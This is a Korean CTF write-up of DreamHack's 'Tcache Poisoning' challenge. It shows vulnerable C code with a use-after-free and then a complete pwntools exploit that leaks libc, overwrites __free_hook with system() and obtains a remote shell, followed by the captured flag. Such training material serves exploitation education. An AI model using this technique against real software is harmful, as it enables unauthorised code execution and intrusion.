# [DreamHack] Tcache Poisoning

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Exploit Tech: Tcache Poisoning에서 실습하는 문제입니다.
>
> Release: [Tcache Poisoning.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8549313/Tcache.Poisoning.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/160296679-4d9822b5-927d-4e85-b22a-f5972dc8b83c.png)

## Analysis

```c
  while (1) {
    printf("1. Allocate\n");
    printf("2. Free\n");
    printf("3. Print\n");
    printf("4. Edit\n");
    scanf("%d", &idx);

    switch (idx) {
      case 1:
        printf("Size: ");
        scanf("%d", &size);
        chunk = malloc(size);
        printf("Content: ");
        read(0, chunk, size - 1);
        break;
      case 2:
        free(chunk);
        break;
      case 3:
        printf("Content: %s", chunk);
        break;
      case 4:
        printf("Edit chunk: ");
        read(0, chunk, size - 1);
        break;
      default:
        break;
    }
  }
```

청크를 free할 때 `chunk` 변수를 0으로 초기화하지 않아서 UAF가 발생한다. 청크를 free시키고 forward pointer를 hook의 주소로 덮으면 hook에 원하는 값을 써서 그 주소를 호출할 수 있다.

free hook에 `system()`의 주소를 넣고 `free("/bin/sh")`를 호출하면 셸을 획득할 수 있다.

## Exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/tcache_poison')
    stdout_offset = 0x3ec760
    freehook_offset = 0x3ed8e8
    system_offset = 0x4f420
else:
    r = remote('host1.dreamhack.games', 9196)
    stdout_offset = 0x3ec760
    freehook_offset = 0x3ed8e8
    system_offset = 0x4f550

sla = r.sendlineafter
sa = r.sendafter


def Alloc(size, content):
    sla('4. Edit\n', '1')
    sla('Size: ', str(size))
    sa('Content: ', content)


def Free():
    sla('4. Edit\n', '2')


def Print():
    sla('4. Edit\n', '3')


def Edit(content):
    sla('4. Edit\n', '4')
    sa('Edit chunk: ', content)


# leak libc

Alloc(0x18, 'a')
Free()
Edit(p64(0x601010))
Alloc(0x18, 'a')
Alloc(0x18, '\x60')
Print()

r.recvuntil('Content: ')
stdout = u64(r.recvn(6).ljust(8, b'\x00'))  # _IO_2_1_stdout_
libc = stdout - stdout_offset  # libc base
system = libc + system_offset  # system()
freehook = libc + freehook_offset  # __free_hook


# overwrite free hook with system()

Alloc(0x28, 'a')
Free()
Edit(p64(freehook))
Alloc(0x28, 'a')
Alloc(0x28, p64(system))


# call system("/bin/sh")

Alloc(0x38, '/bin/sh')
Free()


r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 9196: Done
[*] Switching to interactive mode
$ cat flag
DH{1c94c43ee3c47ad44422f83d7b6fd9a8}
```